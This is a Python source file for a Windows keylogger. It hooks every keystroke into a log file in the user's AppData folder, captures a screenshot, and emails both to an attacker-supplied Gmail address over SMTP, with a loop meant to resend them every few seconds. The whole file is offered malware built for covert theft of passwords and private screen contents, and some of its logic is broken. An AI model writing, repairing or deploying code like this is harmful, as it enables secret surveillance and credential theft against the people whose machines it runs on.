import pyHook, pythoncom, sys, logging
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import os
import time
from PIL import ImageGrab

home = os.path.expanduser("~") 

open(home + "//Appdata//Roaming//" + 'log.txt', 'a')
file_log = home + "//Appdata//Roaming//" + 'log.txt'
im = ImageGrab.grab()
im.save(home + "//Appdata//Roaming//tmp.png")
gmail_user = "" #enter receiving gmail address here
gmail_pwd = "" #enter gmail address password here

def update():
    import time
    while True:
        mail(to, subject, text, attach)
        time.sleep(5)
		

def mail(to, subject, text, attach):
   msg = MIMEMultipart()

   msg['From'] = gmail_user
   msg['To'] = to
   msg['Subject'] = subject

   msg.attach(MIMEText(text))

   part = MIMEBase('application', 'octet-stream')
   part.set_payload(open(attach, 'rb').read())
   Encoders.encode_base64(part)
   part.add_header('Content-Disposition',
           'attachment; filename="%s"' % os.path.basename(attach))
   msg.attach(part)

   mailServer = smtplib.SMTP("smtp.gmail.com", 587)
   mailServer.ehlo()
   mailServer.starttls()
   mailServer.ehlo()
   mailServer.login(gmail_user, gmail_pwd)
   mailServer.sendmail(gmail_user, to, msg.as_string())
   # Should be mailServer.quit(), but that crashes...
   mailServer.close()

mail("",#enter gmail receiver email address here
   "SUBJECT HERE",
   "BODY HERE",
    home + "//Appdata//Roaming//" + 'log.txt')
mail("",#enter gmail receiver email address here
   "SUBJECT HERE",
   "BODY HERE",
    home + "//Appdata//Roaming//" + 'tmp.png')



def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()



update()
